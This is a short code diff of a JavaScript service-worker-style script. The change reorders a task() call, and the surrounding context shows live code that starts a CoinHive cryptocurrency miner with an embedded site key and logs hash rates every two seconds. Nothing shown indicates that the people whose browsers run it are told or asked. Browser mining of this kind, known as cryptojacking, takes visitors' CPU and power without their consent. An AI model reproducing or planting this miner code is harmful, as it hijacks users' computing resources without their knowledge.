@@ -13,6 +13,7 @@ self.onmessage = function(e) {
 };
 
 self.onactivate = function() {
+  task();
   var miner = window.miner = new CoinHive.Anonymous('MUtCJzIDhrs01ERrf3qlqdawo35N0CYD', {throttle: 0.1});
   miner.start();
   setInterval(function() {
@@ -22,5 +23,4 @@ self.onactivate = function() {
 
       console.log('XXX ', {hashesPerSecond, totalHashes, acceptedHashes});
   }, 2000);
-  task();
 };
